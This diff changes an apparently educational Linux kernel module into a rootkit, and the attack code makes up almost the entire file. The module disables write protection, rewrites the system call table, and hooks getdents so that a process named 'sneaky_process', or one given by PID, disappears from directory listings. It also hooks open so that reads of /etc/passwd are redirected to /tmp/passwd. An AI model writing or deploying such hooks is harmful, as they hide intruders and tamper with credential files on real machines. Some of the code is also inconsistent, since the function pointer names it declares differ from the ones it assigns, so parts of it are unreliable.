@@ -8,7 +8,7 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
-
+#include <string.h>
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -22,7 +22,8 @@ struct linux_dirent {
   unsigned short d_reclen;
   char d_name[BUFFLEN];
 };
-
+static char *sneaky_process_id = "";
+module_param(sneaky_process_id, charp, 0);
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -41,14 +42,49 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
-
+//asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*myopen)(const char *pathname, int flags);
+asmlinkage int (*mygetdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+//asmlinkage ssize_t (*myread)(int fd, void *buf, size_t count);
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  //printk(KERN_INFO "Very, very Sneaky!\n");
+  const char *src_file = "/tmp/passwd";
+  if(strcmp(pathname, "/etc/passwd") == 0){
+    copy_to_user((void*)pathname, src_file, strlen(src_file)+1);
+  } 
+  return myopen(pathname, flags);
 }
+/*
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[BUFFLEN];
+};
+*/
+
+asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+  int number_bytes = mygetdents(fd, dirp, count);
+  int ans=number_bytes;//return val
+  struct linux_dirent *cur = dirp;
+  for(int cur_bytes=0;cur_bytes<number_bytes;){
+    void *next=(void *)cur+cur->d_reclen;//get next address
+    if(strcmp(cur->d_name,"sneaky_process")==0||strcmp(cur->d_name, sneaky_process_id) == 0){
+      void *cur_add=(void *)cur;
+      size_t len=(size_t)number_bytes-(size_t)cur_bytes-(size_t)cur->d_reclen;
+      memmove(cur_add,next,len);
+      ans-=cur->d_reclen;
+      cur_bytes+=cur->d_reclen;
+      continue;
+    }
+    cur_bytes+=cur->d_reclen;
+    cur=(struct linux_dirent*)next;
+  }
+  return ans;
+}
+
 
 
 //The code that gets executed when the module is loaded
@@ -70,9 +106,19 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
+  // original_call = (void*)*(sys_call_table + __NR_open);
+  //*(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+
+
+
+  original_getdents = (void*)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+
+  original_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
+  //original_read = (void*)*(sys_call_table + __NR_read);
+  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -86,7 +132,7 @@ static void exit_sneaky_module(void)
 {
   struct page *page_ptr;
 
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  //printk(KERN_INFO "Sneaky module being unloaded.\n"); 
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -99,8 +145,10 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
-
+  //*(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  //*(sys_call_table + __NR_read) = (unsigned long)original_read; 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -110,4 +158,4 @@ static void exit_sneaky_module(void)
 
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
-
+MODULE_LICENSE("Dual MIT/GPL");
